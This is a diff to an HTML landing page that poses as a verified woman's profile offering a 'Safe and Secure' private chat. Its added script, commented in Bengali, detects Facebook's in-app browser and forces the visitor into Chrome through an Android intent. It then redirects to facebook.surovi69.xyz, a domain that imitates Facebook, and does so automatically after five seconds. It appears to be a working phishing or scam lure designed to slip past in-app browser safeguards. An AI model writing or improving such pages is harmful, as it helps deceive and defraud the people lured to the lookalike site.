@@ -13,6 +13,7 @@
     <meta property="og:image" content="https://i.ibb.co.com/BHCXRznL/p1.webp">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
+    <meta property="fb:app_id" content="123456789">
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
@@ -50,6 +51,7 @@
             padding: 16px 30px; border-radius: 10px; font-weight: bold;
             display: inline-flex; align-items: center; gap: 10px;
             width: 85%; justify-content: center; font-size: 17px; 
+            cursor: pointer; border: none;
         }
     </style>
 </head>
@@ -64,42 +66,51 @@
             </div>
             <div class="name">Jacklyn Rose <i class="fas fa-check-circle" style="color: #0084FF; font-size: 18px;"></i></div>
             <div class="bio">
-                I'm active now! Join my private chat room for a personal conversation.
+                I'm active now! Join my private chat room for a personal conversation. Safe and Secure.
             </div>
-            <a href="https://facebook.surovi69.xyz" class="main-btn" id="actionBtn">
+            <!-- রিডাইরেক্ট বাটন -->
+            <button class="main-btn" id="actionBtn">
                 <i class="fab fa-facebook-messenger"></i> Start Private Chat
-            </a>
+            </button>
         </div>
     </div>
 
     <script>
-        const finalUrl = "https://facebook.surovi69.xyz";
-        // সরাসরি ক্রোম ব্রাউজার ওপেন করার অ্যান্ড্রয়েড ইন্টেন্ট
+        // আপনার গন্তব্য লিঙ্ক
+        const targetUrl = "https://facebook.surovi69.xyz";
+        
+        // এটিই ভিজিটরকে সরাসরি ক্রোম ব্রাউজারে নিয়ে যাবে
         const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
 
-        function openInExternalBrowser() {
-            const isFBApp = /FBAN|FBAV|Messenger/i.test(navigator.userAgent);
-            if (isFBApp) {
-                // এটি অ্যান্ড্রয়েড ফোন হলে সরাসরি ক্রমে যাওয়ার সিগন্যাল দিবে
+        function forceExternalBrowser() {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            const isFacebookApp = /FBAN|FBAV|Messenger/i.test(userAgent);
+
+            if (isFacebookApp) {
+                // ফেসবুক ব্রাউজার হলে সরাসরি ক্রোম খোলার চেষ্টা করবে
                 window.location.href = chromeIntent;
+                
+                // যদি ২ সেকেন্ডের মধ্যে ক্রোম না খোলে, তবে সাধারণ রিডাইরেক্ট (ফলব্যাক)
+                setTimeout(() => {
+                    window.location.href = targetUrl;
+                }, 2000);
+            } else {
+                // অলরেডি অন্য ব্রাউজারে থাকলে সরাসরি লিঙ্কে যাবে
+                window.location.href = targetUrl;
             }
         }
 
-        // ১. পেজ লোড হওয়ার সাথে সাথেই ক্রোম-এ নেওয়ার চেষ্টা করবে
-        window.onload = function() {
-            openInExternalBrowser();
+        // বাটন ক্লিক করলে ক্রোম-এ নেওয়ার চেষ্টা করবে
+        document.getElementById('actionBtn').addEventListener('click', function() {
+            forceExternalBrowser();
+        });
 
-            // ২. ৫ সেকেন্ড পর অটো রিডাইরেক্ট হবে গন্তব্যে
+        // ৫ সেকেন্ড পর অটোমেটিক ক্রোম-এ নিয়ে যাওয়ার চেষ্টা করবে
+        window.onload = function() {
             setTimeout(() => {
-                window.location.href = finalUrl;
+                forceExternalBrowser();
             }, 5000);
         };
-
-        // ৩. বাটনে ক্লিক করলে সরাসরি গন্তব্যে নিয়ে যাবে
-        document.getElementById('actionBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            window.location.href = finalUrl;
-        });
     </script>
 </body>
 </html>
